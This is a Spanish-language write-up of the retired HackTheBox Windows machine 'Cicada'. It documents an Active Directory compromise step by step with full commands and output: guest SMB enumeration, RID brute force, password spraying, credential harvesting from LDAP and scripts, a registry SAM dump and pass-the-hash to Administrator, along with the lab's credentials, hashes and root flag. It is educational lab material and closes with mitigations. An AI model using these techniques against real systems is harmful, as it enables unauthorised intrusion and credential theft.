---
title: "Cicada — HackTheBox (Easy / Windows)"
machine: "Cicada"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["SMB", "Active Directory", "RCE", "Privesc", "PowerShell"]
retired: true
summary: "Cicada es una máquina Windows de dificultad Easy en HackTheBox que simula un entorno corporativo con Active Directory. La cadena de explotación es lineal pero c"
draft: false
---
> 
> 
> 
> **Fecha:** Junio 2026
> 
> **Dificultad:** Easy
> 
> **OS:** Windows — Active Directory
> 

---

## 📋 Índice

---

## 🗂 Descripción General

Cicada es una máquina Windows de dificultad **Easy** en HackTheBox que simula un entorno corporativo con **Active Directory**. La cadena de explotación es lineal pero cubre técnicas fundamentales de enumeración AD que se replican fielmente en entornos reales de pentesting.

**Stack tecnológico:**

| Servicio | Puerto | Rol |
| --- | --- | --- |
| SMB | 445 | Shares corporativos |
| LDAP / LDAPS | 389 / 636 | Directorio de usuarios AD |
| Kerberos | 88 | Autenticación del dominio |
| WinRM | 5985 | Acceso remoto PowerShell |
| DNS | 53 | Resolución de dominio |

**Dominio:** `cicada.htb`

**DC:** `CICADA-DC.cicada.htb`

---

## 🔍 Reconocimiento

### Escaneo Nmap

```bash
sudo nmap 10.129.231.149 -p- --open --min-rate 5000 -Pn -n -oG target
```

**Puertos relevantes encontrados:**

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman  ← WinRM abierto = posible shell
49664/tcp open  msrpc
```

> 💡 **Nota:** El perfil de puertos revela inmediatamente un **Domain Controller** de Active Directory. La presencia de WinRM (5985) es clave para el acceso posterior.
> 

---

## 📂 Enumeración SMB — Share HR

El primer vector es SMB. Probamos acceso como **guest** (sesión nula) para enumerar shares disponibles:

```bash
netexec smb 10.129.231.149 -u 'guest' -p '' --shares
```

**Resultado:**

```
SMB  CICADA-DC  [+] cicada.htb\guest:
SMB  CICADA-DC  Share        Permissions  Remark
SMB  CICADA-DC  -----        -----------  ------
SMB  CICADA-DC  ADMIN$                    Remote Admin
SMB  CICADA-DC  C$                        Default share
SMB  CICADA-DC  DEV                       ← sin permisos aún
SMB  CICADA-DC  HR           READ         ← accesible como guest
SMB  CICADA-DC  IPC$         READ         Remote IPC
SMB  CICADA-DC  NETLOGON                  Logon server share
SMB  CICADA-DC  SYSVOL                    Logon server share
```

El share `HR` es accesible sin credenciales. Dentro encontramos un archivo de onboarding:

```bash
smbclient //10.129.231.149/HR -N
smb: \> get "Notice from HR.txt"
```

**Contenido de `Notice from HR.txt`:**

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team.
As part of our security protocols, it's essential that you change
your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

> ⚠️ **Hallazgo crítico:** Contraseña por defecto para nuevos empleados expuesta en un share accesible públicamente. Patrón extremadamente común en entornos corporativos reales.
> 

---

## 👥 RID Brute Force — Enumeración de Usuarios

Con la sesión guest aún activa, enumeramos los usuarios del dominio mediante **RID brute force**:

```bash
netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute 2>/dev/null | grep SidTypeUser
```

**Usuarios del dominio encontrados:**

```
500: CICADA\Administrator
501: CICADA\Guest
502: CICADA\krbtgt
1000: CICADA\CICADA-DC$
1104: CICADA\john.smoulder
1105: CICADA\sarah.dantelia
1106: CICADA\michael.wrightson
1108: CICADA\david.orelious
1601: CICADA\emily.oscars
```

Extraemos los usuarios relevantes a un archivo:

```bash
cat << 'EOF' > users.txt
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
EOF
```

---

## 🔑 Password Spray → michael.wrightson

Con la lista de usuarios y la contraseña por defecto del archivo HR, ejecutamos un **password spray**:

```bash
netexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

**Resultado:**

```
[-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8   STATUS_LOGON_FAILURE
[-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8   STATUS_LOGON_FAILURE
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8  ← VÁLIDO
[-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8   STATUS_LOGON_FAILURE
[-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8     STATUS_LOGON_FAILURE
```

✅ **Credenciales válidas:** `michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8`

> 💡 michael.wrightson no había cambiado la contraseña por defecto — algo que también ocurre con frecuencia en entornos reales, especialmente con cuentas de empleados nuevos o poco activos.
> 

---

## 🗃 Enumeración LDAP → david.orelious

Con credenciales válidas, enumeramos todos los usuarios del AD vía LDAP buscando información adicional en los campos de descripción:

```bash
netexec ldap 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

**Resultado completo:**

```
-Username-          -Last PW Set-        -BadPW-  -Description-
Administrator       2024-08-26 16:08:03  0        Built-in account for administering...
Guest               2024-08-28 13:26:56  0        Built-in account for guest access...
krbtgt              2024-03-14 07:14:10  0        Key Distribution Center Service Account
john.smoulder       2024-03-14 08:17:29  1
sarah.dantelia      2024-03-14 08:17:29  1
michael.wrightson   2024-03-14 08:17:29  0
david.orelious      2024-03-14 08:17:29  1    Just in case I forget my password is aRt$Lp#7t*VQ!3
emily.oscars        2024-08-22 17:20:17  1
```

> 🚨 **Error humano clásico:** `david.orelious` almacenó su contraseña en el campo de descripción de LDAP. Cualquier usuario autenticado del dominio puede leer este campo. Es uno de los errores más frecuentes en auditorías de AD reales.
> 

✅ **Credenciales válidas:** `david.orelious : aRt$Lp#7t*VQ!3`

---

## 💾 Share DEV → emily.oscars

David tiene acceso al share `DEV` que antes estaba restringido:

```bash
netexec smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares

smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
smb: \> recurse ON
smb: \> mget *
```

Dentro del share `DEV` encontramos un script de automatización (`.ps1`) con credenciales hardcodeadas:

```powershell
# Fragmento del script encontrado en DEV
$username = "emily.oscars"
$password = "Q!3@Lp#M6b*7t*Vt"
```

✅ **Credenciales válidas:** `emily.oscars : Q!3@Lp#M6b*7t*Vt`

> 💡 Credenciales hardcodeadas en scripts es otro clásico de entornos corporativos reales — especialmente en tareas automatizadas o scripts de mantenimiento.
> 

---

## 🚩 Flag de Usuario

emily.oscars tiene acceso por **WinRM** (puerto 5985). Accedemos con evil-winrm:

```bash
evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

```
Evil-WinRM shell v3.9
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

```powershell
*Evil-WinRM* PS C:\> cat C:\Users\emily.oscars.CICADA\Desktop\user.txt
```

> 🏁 **user.txt** — ✅ Capturado
> 

---

## ⬆️ Escalada de Privilegios — SAM Dump

Como emily.oscars tiene privilegios suficientes para volcar el registro, extraemos los hashes locales del sistema:

### Paso 1 — Crear directorio de trabajo

```powershell
*Evil-WinRM* PS C:\> New-Item -ItemType Directory -Force -Path "C:\Temp"
```

### Paso 2 — Volcar SAM y SYSTEM

```powershell
*Evil-WinRM* PS C:\> reg save HKEY_LOCAL_MACHINE\SAM C:\Temp\sam.bak
*Evil-WinRM* PS C:\> reg save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\system.bak
```

### Paso 3 — Descargar los archivos

```powershell
*Evil-WinRM* PS C:\Temp> download sam.bak
*Evil-WinRM* PS C:\Temp> download system.bak
```

### Paso 4 — Extraer hashes con impacket

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**Resultado:**

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Paso 5 — Pass-the-Hash como Administrator

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 🏁 Flag de Root

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat "C:\Users\Administrator\Desktop\root.txt"
0d2f7e20dc25bf531956a8733a9d80f9
```

> 🏁 **root.txt** — ✅ Capturado
> 

---

## 🗺 Resumen de la Cadena de Ataque

```
┌──────────────────────────────────────────────────────────────────┐
│              CICADA — Cadena de Ataque                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Nmap → DC identificado (SMB, LDAP, Kerberos, WinRM)            │
│              │                                                   │
│              ▼                                                   │
│  SMB Guest → Share HR → Notice from HR.txt                      │
│              │                                                   │
│              ▼                                                   │
│  Contraseña por defecto: Cicada$M6Corpb*@Lp#nZp!8               │
│              │                                                   │
│              ▼                                                   │
│  RID Brute → 5 usuarios del dominio enumerados                  │
│              │                                                   │
│              ▼                                                   │
│  Password Spray → michael.wrightson (no cambió la pass)         │
│              │                                                   │
│              ▼                                                   │
│  LDAP Enum → david.orelious (pass en descripción LDAP)          │
│              │                                                   │
│              ▼                                                   │
│  SMB DEV → Script .ps1 → emily.oscars (creds hardcodeadas)      │
│              │                                                   │
│              ▼                                                   │
│  WinRM → emily.oscars → user.txt ✓                              │
│              │                                                   │
│              ▼                                                   │
│  reg save SAM + SYSTEM → impacket-secretsdump                   │
│              │                                                   │
│              ▼                                                   │
│  NT Hash Administrator → Pass-the-Hash → root.txt ✓            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 🎓 Lecciones Aprendidas

Esta máquina es un excelente ejemplo de cómo **errores humanos simples** en la gestión de Active Directory pueden comprometer un dominio entero:

| Error cometido | Impacto | Mitigación |
| --- | --- | --- |
| Share accesible a guest con datos sensibles | Credencial inicial expuesta | ACLs estrictas en shares SMB, nunca datos sensibles en shares públicos |
| Usuario no cambia contraseña por defecto | Acceso inicial al dominio | Forzar cambio de contraseña en primer login (`Must change password`) |
| Contraseña en campo `description` de AD | Escalada horizontal | Auditoría periódica de atributos LDAP — `Get-ADUser -Filter * -Properties Description` |
| Credenciales hardcodeadas en script | Acceso a nueva cuenta | Usar Service Accounts con Managed Passwords o secrets managers |
| Permisos para volcar SAM | Escalada a Administrator | Principio de mínimo privilegio; monitorizar acceso a HKLM\SAM |

### Herramientas utilizadas

- `nmap` — Reconocimiento de puertos
- `netexec` — Enumeración SMB / LDAP y password spray
- `smbclient` — Acceso a shares SMB
- `evil-winrm` — Shell remota via WinRM
- `impacket-secretsdump` — Extracción de hashes del SAM

---

*Writeup por* **4Pr3nd1z***— Junio 2026*
